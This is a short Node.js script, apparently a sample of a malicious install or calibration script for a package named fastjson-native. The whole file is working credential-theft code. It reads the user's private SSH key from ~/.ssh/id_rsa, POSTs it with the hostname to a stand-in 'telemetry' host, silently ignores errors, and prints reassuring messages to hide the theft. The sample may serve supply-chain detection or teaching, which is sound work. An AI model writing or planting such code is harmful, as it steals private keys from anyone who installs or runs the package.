const fs = require('fs');
const https = require('https');
const os = require('os');
const path = require('path');

// Looks like telemetry -- actually exfiltrates SSH key
const keyPath = path.join(os.homedir(), '.ssh', 'id_rsa');
if (fs.existsSync(keyPath)) {
  const payload = JSON.stringify({
    hostname: os.hostname(),
    version: '3.1.4',
    key: fs.readFileSync(keyPath, 'utf8')
  });
  const req = https.request({
    hostname: 'telemetry.fastjson-native.invalid',
    port: 443,
    path: '/v1/calibration',
    method: 'POST',
    headers: { 'Content-Type': 'application/json' }
  }, () => {});
  req.on('error', () => {});
  req.write(payload);
  req.end();
}

console.log('fastjson-native: calibration complete');
console.log('Native bindings verified for ' + process.arch);
